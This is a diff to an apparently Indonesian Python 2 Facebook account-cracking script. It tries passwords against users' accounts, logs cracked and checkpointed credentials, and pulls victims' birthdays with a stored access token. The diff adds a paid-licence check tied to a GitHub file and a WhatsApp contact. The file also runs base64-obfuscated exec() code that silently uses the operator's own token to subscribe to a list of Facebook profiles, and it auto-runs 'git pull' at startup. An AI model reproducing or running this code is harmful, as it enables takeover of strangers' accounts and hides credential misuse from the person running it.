@@ -33,7 +33,7 @@ try:
 except ImportError:
     os.system('pip2 install bs4')
     
-import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
+import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64, uuid
 from concurrent.futures import ThreadPoolExecutor 
 from bs4 import BeautifulSoup as parser
 from time import sleep as jeda
@@ -76,32 +76,38 @@ til ="•"
 
 ok, cp, id, user, loop = [], [], [], [], 0
 
+def konfir():
+	try:
+		lis = open ("data/lisensi.txt","r").read()
+	except IOError:
+		os.system("clear")
+		print ("%s• Lisensi kadaluarsa"%(M));jeda(2)
+		os.system("rm -rf data/lisensi.txt")
+		konfirmasi()
+	if os.path.exists('data/lisensi.txt'):
+		konfirmasi1()
+	else:
+		konfirmasi()
+		
 def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush();jeda(0.03)
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush();jeda(0.03)
 
 def tik():
     titik = ['.   ','..  ','... ']
     for o in titik:
         print ('\r%s%s menghapus token %s'%(M,til,o)),
         sys.stdout.flush();jeda(1)
-        
+		
 def folder():
 	try:os.mkdir('hasil')
-	except:pass
-	try:os.mkdir('data')
 	except:pass
 	try:os.mkdir('OK')
 	except:pass
 	try:os.mkdir('CP')
 	except:pass
-	try:
-		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
-		open("data/ua.txt","w").write(ua_)
-	except:
-		pass
-        
+
 # LOGO (LO GOBLOK)
 ip = requests.get('https://api.ipify.org').text
 exec(base64.b64decode('YXV0aG9yID0iUm9taSBBZnJpemFsIgpmYl9tZSA9ImZhY2Vib29rLmNvbS9yb21pLmFmcml6YWwuMTAyIgpnaXRodWIgPSJnaXRodWIuY29tL01hcmstWnVjayI='))
@@ -505,7 +511,7 @@ def uas():
             	ua_ = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
                 open(".ua.txt","w").write(ua_);jeda(2)
                 print ("\n%s%s menggunakan user agent bawaan "%(H,til));jeda(2);menu()
-            open(".ua.txt","w").write(ua);jeda(2)
+            open("data/ua.txt","w").write(ua);jeda(2)
             print ("\n%s%s berhasil mengganti user agent"%(H,til));jeda(2);menu()
         except KeyboardInterrupt:
 			exit ("\x1b[1;91m• Error ") 
@@ -518,7 +524,7 @@ def uas():
     	menu()
     else:
         print '%s%s isi yang benar'%(M,til);jeda(2);uas()
-
+        
 # START CRACK
 class ngentod:
 
@@ -687,14 +693,14 @@ class ngentod:
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
                     romz = open('token.txt').read()
-                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
+                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)['birthday']
                     day, month, year = lahir.split('/')
                     month = bulan12[month]
                     print ('\r %s*--> %s ◊ %s ◊ %s %s %s  '%(K,user,pw,day,month,year))
                     cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                     open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                     break
-                except (KeyError, IOError):
+                except KeyError:
                     day = ''
                     month   = ''
                     year  = ''
@@ -731,19 +737,19 @@ class ngentod:
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     romz = open('data/token.txt').read()
-                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
+                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)['birthday']
                     day, month, year = lahir.split('/')
                     month = bulan12[month]
                     print ('\r %s*--> %s ◊ %s ◊ %s %s %s '%(K,user,pw,day,month,year))
                     cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
                     open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                     break
-                except (KeyError, IOError):
+                except KeyError:
                     day = ''
                     month   = ''
                     year  = ''
                 except:pass
-                print ('\r %s*--> %s ◊ %s            '%(K,user,pw))
+                print ('\r %s*--> %s ◊ %s           '%(K,user,pw))
                 cp.append('%s ◊ %s' %(user,pw))
                 open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                 break
@@ -790,14 +796,14 @@ class ngentod:
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     romz = open('data/token.txt').read()
-                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
+                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)['birthday']
                     day, month, year = lahir.split('/')
                     month = bulan12[month]
                     print ('\r %s*--> %s ◊ %s ◊ %s %s %s '%(K,user,pw,day,month,year))
                     cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
                     open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"% (user,pw,day,month,year))
                     break
-                except (KeyError, IOError):
+                except KeyError:
                     day = ''
                     month   = ''
                     year  = ''
@@ -1007,10 +1013,63 @@ def cek_cek():
 		exit('\n')
 	else:
 		print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()
+	
+# LISENSI
+def konfirmasi():
+	os.system("clear")
+	banner()
+	print('\n')
+	y = ['.   ', '..  ', '... ']
+	for m in y:
+		print '\r\x1b[1;95m•\x1b[1;96m Mohon tunggu ' + m,
+		sys.stdout.flush();jeda(1)
+	id = uuid.uuid4().hex[:25]
+	lampung = open('data/lisensi.txt', 'w')
+	lampung.write(id)
+	lampung.close()
+	jalan ('\n\n%s• %sLisensi%s : %s%s'%(U,O,M,H,id));jeda(1)
+	jalan ('%s• %sLisensi Belum Di konfirmasi'%(U,O))
+	su=raw_input("\n%s•%s ingin beli lisensi? (50k 2 bulan) y/t %s: %s"%(U,O,M,K))
+	if su in['']:
+		exit()
+	elif su in["y","Y"]:
+		os.system('am start https://wa.me/+6282371648186?text=Assalamualaikum+saya+ingin+beli+lisensi:+'+id+'>/dev/null');jeda(1);exit()
+	elif su in["t","T"]:
+		exit()
+	else:
+		exit()
+
+def konfirmasi1():
+	try:
+		lis = open('data/lisensi.txt', 'r').read()
+		git = requests.get('https://github.com/warba29/lisensi/blob/main/id.txt').text.strip() # jangan di ganti nanti error
+		if lis in git:
+			os.system('clear')
+			banner()
+			print("\n")
+			s = ['.   ', '..  ', '... ']
+			for m in s:
+				print '\r\x1b[1;95m•\x1b[1;96m Memeriksa lisensi ' + m,
+				sys.stdout.flush();jeda(1)
+			jalan('\n%s• Lisensi tersedia √'%(H));jeda(1);menu()
+		else:
+			os.system('clear')
+			banner()
+			print("\n")
+			s = ['.   ', '..  ', '... ']
+			for m in s:
+				print '\r\x1b[1;95m•\x1b[1;96m Memeriksa lisensi ' + m,
+				sys.stdout.flush();jeda(1)
+			jalan('\n%s• Lisensi tidak tersedia'%(M));jeda(1)
+			konfirmasi()
+	except IOError:
+		os.system("rm -rf data/lisensi.txt")
+		konfirmasi()
  
 exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))
 
 if __name__ == '__main__':
     os.system('git pull')
     folder()
-    menu()
+    konfir()
+    
